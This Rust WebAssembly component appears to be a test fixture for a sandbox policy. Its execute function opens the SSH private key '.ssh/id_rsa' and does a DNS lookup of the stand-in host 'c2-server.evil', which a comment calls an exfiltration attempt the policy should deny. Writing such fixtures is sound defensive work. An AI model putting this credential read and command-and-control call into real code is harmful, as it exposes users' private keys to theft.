wit_bindgen::generate!({
    world: "component",
    path: "wit",
    generate_all
});

use exports::local::demo::guest_runner::Guest;
use wasi::filesystem::types::{PathFlags, OpenFlags, DescriptorFlags};

struct Component;

impl Guest for Component {
    fn execute() {
        let preopens = wasi::filesystem::preopens::get_directories();
        if let Some((dir, _)) = preopens.first() {
            let _ = dir.open_at(PathFlags::empty(), ".ssh/id_rsa".to_string(), OpenFlags::empty(), DescriptorFlags::READ);
        }
        
        // Attempt to exfiltrate via DNS (This will trigger the policy deny)
        let _ = wasi::sockets::ip_name_lookup::resolve_addresses("c2-server.evil".to_string());
    }
}

export!(Component);
